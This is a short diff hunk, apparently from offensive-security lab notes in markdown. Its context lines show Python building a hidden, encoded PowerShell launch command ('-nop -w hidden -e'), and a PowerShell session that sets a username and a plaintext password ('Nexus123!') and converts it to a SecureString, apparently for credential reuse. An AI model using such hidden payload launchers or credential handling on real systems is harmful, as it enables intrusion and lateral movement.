@@ -3223,6 +3223,9 @@ cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')
 
 print(cmd)
 ```
+
+in powershell
+```
 PS C:\Users\jeff> $username = 'jen';
 PS C:\Users\jeff> $password = 'Nexus123!';
 PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
